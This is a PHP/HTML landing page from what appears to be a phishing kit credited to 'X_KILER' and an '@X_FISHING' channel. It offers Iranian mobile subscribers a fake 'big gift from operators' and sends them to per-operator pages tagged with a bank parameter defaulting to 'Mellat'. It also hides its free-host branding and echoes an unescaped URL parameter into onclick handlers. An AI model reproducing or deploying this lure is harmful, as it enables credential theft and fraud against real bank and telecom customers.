﻿<?php
$e=intval($_GET["e"]);
if(isset($_GET["P"])){
	$P=$_GET["P"];
}else{
	$P="Mellat";
}
?>

<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<!--***************Created By:X_KILER***************-->
<!--***************Channel:@X_FISHING***************-->
	<link href="css/style.css" rel="stylesheet"/>
	<meta content="text/html; charset=UTF-8" http-equiv="Content-Type"/>
<title>هدیه بزرگ اپراتورها به مشتریان</title>
<meta name="viewport" content="width=device-width">
<style>img[alt="www.000webhost.com"]{display:none;}</style>
</head>
<!--***************Created By:X_KILER***************-->
<!--***************Channel:@X_FISHING***************-->
<body>
<div class="border">
<h6 class="title">داغ ترین پیشنهاد ویژه به منظوربالابردن سطح رضایت مشتری</h6>
<p class="text">اپراتور خود را انتخاب نمایید</p>
<button id="irancell" type="button" onclick="location.href='irancell.php?P=<?php echo $P?>&e=<?php echo $e?>';"></button>
<button id="mci" type="button" onclick="location.href='mci.php?P=<?php echo $P?>&e=<?php echo $e?>';"></button>
<button id="rightel" type="button" onclick="location.href='rightel.php?P=<?php echo $P?>&e=<?php echo $e?>';"></button>
</div>
<!--***************Created By:X_KILER***************-->
<!--***************Channel:@X_FISHING***************-->
</body>
</html>

